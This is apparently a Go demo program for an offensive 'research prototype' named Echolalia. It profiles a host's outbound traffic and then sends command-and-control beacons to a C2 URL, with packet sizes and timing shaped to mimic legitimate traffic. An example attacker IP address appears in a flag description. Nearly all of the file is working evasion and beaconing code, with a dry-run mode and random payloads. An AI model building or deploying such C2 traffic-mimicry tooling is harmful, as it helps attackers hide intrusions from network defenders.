// echo-beacon: end-to-end demo for the Echolalia research prototype.
//
// It profiles the host's outbound traffic for a configurable window, then
// sends a synthetic beacon payload to the C2 URL using Echolalia's mimicry
// transport. Each run prints the profiled process, KS statistics, and
// per-packet send timestamps so you can verify timing matches the profile.
package main

import (
	"context"
	"crypto/rand"
	"flag"
	"fmt"
	"log"
	"math"
	"os"
	"sort"
	"time"

	"github.com/Emul4nt/echolalia/mimicry"
	"github.com/Emul4nt/echolalia/profiler"
	"github.com/Emul4nt/echolalia/transport"
)

func main() {
	c2URL := flag.String("c2", "", "C2 URL to beacon to (e.g. http://209.99.191.245:8080)")
	profileSecs := flag.Int("profile-secs", 30, "seconds to spend profiling host traffic")
	payloadKB := flag.Int("payload-kb", 64, "synthetic payload size in KB")
	beacons := flag.Int("beacons", 3, "number of beacon rounds to send")
	dryRun := flag.Bool("dry-run", false, "shape traffic but don't actually send (offline demo)")
	flag.Parse()

	if *c2URL == "" && !*dryRun {
		fmt.Fprintln(os.Stderr, "error: -c2 required unless -dry-run is set")
		flag.Usage()
		os.Exit(1)
	}

	log.SetFlags(log.Ltime | log.Lmsgprefix)
	log.SetPrefix("[echolalia] ")

	ctx := context.Background()

	log.Printf("profiling host traffic for %ds...", *profileSecs)
	profCtx, cancel := context.WithTimeout(ctx, time.Duration(*profileSecs)*time.Second)
	profile, err := profiler.Profile(profCtx, time.Duration(*profileSecs)*time.Second)
	cancel()
	if err != nil {
		log.Fatalf("profiling failed: %v", err)
	}

	log.Printf("profiled: process=%q pid=%d method=%s protocol=%s",
		profile.ProcessName, profile.PID, profile.CaptureMethod, profile.Protocol)
	log.Printf("stats: avg_pkt=%.0fb stddev=%.0fb avg_iat=%.3fs iat_shape=%s",
		profile.AvgPktSize, profile.PktSizeStddev, profile.AvgIAT, profile.IATDistShape)
	if profile.JA4 != "" {
		log.Printf("JA4: %s", profile.JA4)
	}

	payload := make([]byte, *payloadKB*1024)
	if _, err := rand.Read(payload); err != nil {
		log.Fatalf("rand.Read: %v", err)
	}

	seq, err := mimicry.Shape(profile, payload)
	if err != nil {
		log.Fatalf("mimicry.Shape: %v", err)
	}

	sizes := make([]float64, len(seq.Packets))
	for i, p := range seq.Packets {
		sizes[i] = float64(len(p.Data))
	}
	ref := make([]float64, len(sizes))
	for i := range ref {
		ref[i] = mimicry.EmpiricalSample(profile)
	}
	ks := ksStatistic(sizes, ref)
	log.Printf("shaped %d packets, KS statistic D=%.4f (want < 0.15)", len(seq.Packets), ks)

	if *dryRun {
		log.Printf("dry-run: first 5 packet sizes and send times:")
		for i, p := range seq.Packets {
			if i >= 5 {
				log.Printf("  ... (%d more packets)", len(seq.Packets)-5)
				break
			}
			log.Printf("  pkt[%d] size=%d send_at=%s", i, len(p.Data), p.SendAt.Format("15:04:05.000"))
		}
		log.Printf("dry-run complete — no traffic sent")
		return
	}

	core := &fakeCore{payload: payload}
	t, err := transport.NewWithProfile(profile, core, *c2URL)
	if err != nil {
		log.Fatalf("transport.NewWithProfile: %v", err)
	}

	for i := 1; i <= *beacons; i++ {
		log.Printf("beacon round %d/%d...", i, *beacons)
		start := time.Now()
		if err := t.Beacon(ctx); err != nil {
			log.Printf("beacon %d failed: %v", i, err)
		} else {
			log.Printf("beacon %d ok (%.2fs)", i, time.Since(start).Seconds())
		}
		if i < *beacons {
			time.Sleep(time.Duration(profile.AvgIAT*1000) * time.Millisecond)
		}
	}
	log.Printf("done")
}

type fakeCore struct{ payload []byte }

func (f *fakeCore) GetBeaconPayload() ([]byte, error) { return f.payload, nil }
func (f *fakeCore) DeliverResponse([]byte) error      { return nil }

func ksStatistic(a, b []float64) float64 {
	ac := make([]float64, len(a))
	bc := make([]float64, len(b))
	copy(ac, a)
	copy(bc, b)
	sort.Float64s(ac)
	sort.Float64s(bc)
	n1, n2 := float64(len(ac)), float64(len(bc))
	var i, j int
	var d float64
	for i < len(ac) || j < len(bc) {
		switch {
		case i < len(ac) && (j >= len(bc) || ac[i] < bc[j]):
			i++
		case j < len(bc) && (i >= len(ac) || bc[j] < ac[i]):
			j++
		default:
			i++
			j++
		}
		if diff := math.Abs(float64(i)/n1 - float64(j)/n2); diff > d {
			d = diff
		}
	}
	return d
}
